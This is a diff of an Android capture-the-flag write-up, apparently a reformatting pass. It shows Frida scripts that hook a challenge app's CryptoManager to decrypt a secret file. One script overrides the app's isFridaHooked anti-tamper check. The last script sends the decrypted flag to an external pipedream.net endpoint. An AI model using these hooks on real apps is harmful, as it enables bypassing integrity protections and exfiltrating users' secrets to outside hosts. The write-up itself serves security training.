@@ -87,13 +87,12 @@ frida-server: 1 file pushed. 27.2 MB/s (42925716 bytes in 1.506s)
 └──╼ $ adb shell
 genymotion:/ # cd /data/local/tmp/
 genymotion:/data/local/tmp # ls -ltra
-genymotion:/data/local/tmp/dd # ls -ltra
 total 41944
 -rw-rw-rw- 1 root  root  42925716 2021-02-16 22:35 frida-server
 drwxrwx--x 4 shell shell     4096 2023-07-03 19:51 ..
 drwxrwxrwx 2 root  root      4096 2023-07-03 19:51 .
-genymotion:/data/local/tmp/dd # chmod +x frida-server
-genymotion:/data/local/tmp/dd # ./frida-server &
+genymotion:/data/local/tmp # chmod +x frida-server
+genymotion:/data/local/tmp # ./frida-server &
 ```
 
 Next, we must compose the JavaScript code to implement our desired logic.
@@ -127,34 +126,32 @@ Based on the functionality of the `decrypt` method, our JavaScript code should b
 ```JavaScript
 Java.perform(function() {
 
-  Java.enumerateLoadedClasses({
-    onMatch: function(className) {
-      if (className === "com.plcoding.androidcrypto.CryptoManager") {
-        Java.choose(className, {
-          onMatch: function(instance) {
-			
-			console.log("Found an instance of CryptoManager");
-			console.log("Creating FileInputStream with /data/data/com.plcoding.androidcrypto/files/secret.txt");
-            var File = Java.use("java.io.File");
-            var FileInputStream = Java.use("java.io.FileInputStream");
+    Java.enumerateLoadedClasses({
+        onMatch: function(className) {
+            if (className === "com.plcoding.androidcrypto.CryptoManager") {
+                Java.choose(className, {
+                    onMatch: function(instance) {
 
-            var filePath = "/data/data/com.plcoding.androidcrypto/files/secret.txt";
-            var file = Java.cast(File.$new(filePath), File);
-            var fileInputStream = FileInputStream.$new(file);
-			
-			console.log("Calling to decrypt...");
-            var flagByteArray = Java.array('byte', instance.decrypt(fileInputStream));  // Convert to Java byte array
-			var str = String.fromCharCode.apply(null, flagByteArray);
-			console.log("Flag: " + str);
-          },
-          onComplete: function() {
-          }
-        });
-      }
-    },
-    onComplete: function() {
-    }
-  });
+                        console.log("Found an instance of CryptoManager");
+                        console.log("Creating FileInputStream with /data/data/com.plcoding.androidcrypto/files/secret.txt");
+                        var File = Java.use("java.io.File");
+                        var FileInputStream = Java.use("java.io.FileInputStream");
+                        
+                        var filePath = "/data/data/com.plcoding.androidcrypto/files/secret.txt";
+                        var file = Java.cast(File.$new(filePath), File);
+                        var fileInputStream = FileInputStream.$new(file);
+                        
+                        console.log("Calling to decrypt...");
+                        var flagByteArray = Java.array('byte', instance.decrypt(fileInputStream)); // Convert to Java byte array
+                        var str = String.fromCharCode.apply(null, flagByteArray);
+                        console.log("Flag: " + str);
+                    },
+                    onComplete: function() {}
+                });
+            }
+        },
+        onComplete: function() {}
+    });
 
 });
 ```
@@ -241,40 +238,38 @@ To bypass this mechanism, we can override the logic of the `isFridaHooked` metho
 */
 Java.perform(function() {
 
-   var AppIntegrityChecker = Java.use("com.plcoding.androidcrypto.AppIntegrityChecker$Companion");
-   AppIntegrityChecker.isFridaHooked.overload().implementation = function() {
-		console.log("Custom implementation of isFridaHooked method - return false");
-		return false;
-  };
-	
-  Java.enumerateLoadedClasses({
-    onMatch: function(className) {
-      if (className === "com.plcoding.androidcrypto.CryptoManager") {
-        Java.choose(className, {
-          onMatch: function(instance) {
-			
-				console.log("Found an instance of CryptoManager");
-				console.log("Creating FileInputStream with /data/data/com.plcoding.androidcrypto/files/secret.txt");
-				var File = Java.use("java.io.File");
-				var FileInputStream = Java.use("java.io.FileInputStream");
+    var AppIntegrityChecker = Java.use("com.plcoding.androidcrypto.AppIntegrityChecker$Companion");
+    AppIntegrityChecker.isFridaHooked.overload().implementation = function() {
+        console.log("Custom implementation of isFridaHooked method - return false");
+        return false;
+    };
 
-				var filePath = "/data/data/com.plcoding.androidcrypto/files/secret.txt";
-				var file = Java.cast(File.$new(filePath), File);
-				var fileInputStream = FileInputStream.$new(file);
-				
-				console.log("Calling to decrypt...");
-				var flagByteArray = Java.array('byte', instance.decrypt(fileInputStream));  // Convert to Java byte array
-				var str = String.fromCharCode.apply(null, flagByteArray);
-				console.log("Flag: " + str);
-          },
-          onComplete: function() {
-          }
-        });
-      }
-    },
-    onComplete: function() {
-    }
-  });
+    Java.enumerateLoadedClasses({
+        onMatch: function(className) {
+            if (className === "com.plcoding.androidcrypto.CryptoManager") {
+                Java.choose(className, {
+                    onMatch: function(instance) {
+
+                        console.log("Found an instance of CryptoManager");
+                        console.log("Creating FileInputStream with /data/data/com.plcoding.androidcrypto/files/secret.txt");
+                        var File = Java.use("java.io.File");
+                        var FileInputStream = Java.use("java.io.FileInputStream");
+
+                        var filePath = "/data/data/com.plcoding.androidcrypto/files/secret.txt";
+                        var file = Java.cast(File.$new(filePath), File);
+                        var fileInputStream = FileInputStream.$new(file);
+
+                        console.log("Calling to decrypt...");
+                        var flagByteArray = Java.array('byte', instance.decrypt(fileInputStream)); // Convert to Java byte array
+                        var str = String.fromCharCode.apply(null, flagByteArray);
+                        console.log("Flag: " + str);
+                    },
+                    onComplete: function() {}
+                });
+            }
+        },
+        onComplete: function() {}
+    });
 
 });
 ```
@@ -321,66 +316,58 @@ After uploading the script, we don't see the output. To leak the flag, we can se
    $ frida -U -p <PID> -l solve.js
 */
 Java.perform(function() {
-   
-   var AppIntegrityChecker = Java.use("com.plcoding.androidcrypto.AppIntegrityChecker$Companion");
-   AppIntegrityChecker.isFridaHooked.overload().implementation = function() {
-		console.log("Custom implementation of isFridaHooked method - return false");
-		return false;
-   };
-   
-  Java.enumerateLoadedClasses({
-    onMatch: function(className) {
-      if (className === "com.plcoding.androidcrypto.CryptoManager") {
-        Java.choose(className, {
-          onMatch: function(instance) {
-			
-			console.log("Found an instance of CryptoManager");
-			console.log("Creating FileInputStream with /data/data/com.plcoding.androidcrypto/files/secret.txt");
-			var File = Java.use("java.io.File");
-			var FileInputStream = Java.use("java.io.FileInputStream");
 
-			var filePath = "/data/data/com.plcoding.androidcrypto/files/secret.txt";
-			var file = Java.cast(File.$new(filePath), File);
-			var fileInputStream = FileInputStream.$new(file);
-			
-			console.log("Calling to decrypt...");
-			var flagByteArray = Java.array('byte', instance.decrypt(fileInputStream));  // Convert to Java byte array
-			var str = String.fromCharCode.apply(null, flagByteArray);
-			console.log("Flag: " + str);
-			
-			var URL = Java.use('java.net.URL');
-			var BufferedReader = Java.use('java.io.BufferedReader');
-			var InputStreamReader = Java.use('java.io.InputStreamReader');
-			var HttpURLConnection = Java.use('java.net.HttpURLConnection');
+    var AppIntegrityChecker = Java.use("com.plcoding.androidcrypto.AppIntegrityChecker$Companion");
+    AppIntegrityChecker.isFridaHooked.overload().implementation = function() {
+        console.log("Custom implementation of isFridaHooked method - return false");
+        return false;
+    };
 
-			// Define the URL to send the GET request
-			var url = "https://eofkllb4ccony1x.m.pipedream.net/" + str;
-			console.log("Sending " + url);
-			// Create a new URL object
-			var urlObject = URL.$new(url);
+    Java.enumerateLoadedClasses({
+        onMatch: function(className) {
+            if (className === "com.plcoding.androidcrypto.CryptoManager") {
+                Java.choose(className, {
+                    onMatch: function(instance) {
 
-			// Open a connection to the URL
-			var connection = urlObject.openConnection();
+                        console.log("Found an instance of CryptoManager");
+                        console.log("Creating FileInputStream with /data/data/com.plcoding.androidcrypto/files/secret.txt");
+                        var File = Java.use("java.io.File");
+                        var FileInputStream = Java.use("java.io.FileInputStream");
 
-			// Cast the connection to HttpURLConnection
-			var httpConnection = Java.cast(connection, HttpURLConnection);
+                        var filePath = "/data/data/com.plcoding.androidcrypto/files/secret.txt";
+                        var file = Java.cast(File.$new(filePath), File);
+                        var fileInputStream = FileInputStream.$new(file);
 
-			// Set the request method to GET
-			httpConnection.setRequestMethod('GET');
+                        console.log("Calling to decrypt...");
+                        var flagByteArray = Java.array('byte', instance.decrypt(fileInputStream)); // Convert to Java byte array
+                        var str = String.fromCharCode.apply(null, flagByteArray);
+                        console.log("Flag: " + str);
 
-			// Send the request and retrieve the response
-			var responseCode = httpConnection.getResponseCode();
+                        var URL = Java.use('java.net.URL');
+                        var BufferedReader = Java.use('java.io.BufferedReader');
+                        var InputStreamReader = Java.use('java.io.InputStreamReader');
+                        var HttpURLConnection = Java.use('java.net.HttpURLConnection');
 
-			console.log("Done " + responseCode);
-          },
-          onComplete: function() {
-          }
-        });
-      }
-    },
-    onComplete: function() {
-    }
-  });
+                        // Define the URL to send the GET request
+                        var url = "https://eofkllb4ccony1x.m.pipedream.net/" + str;
+                        console.log("Sending " + url);
+                        
+                        var urlObject = URL.$new(url);
+                        var connection = urlObject.openConnection();
+						
+                        var httpConnection = Java.cast(connection, HttpURLConnection);
+						
+                        httpConnection.setRequestMethod('GET');
+                        var responseCode = httpConnection.getResponseCode();
+
+                        console.log("Done " + responseCode);
+                    },
+                    onComplete: function() {}
+                });
+            }
+        },
+        onComplete: function() {}
+    });
 
 });
 ```
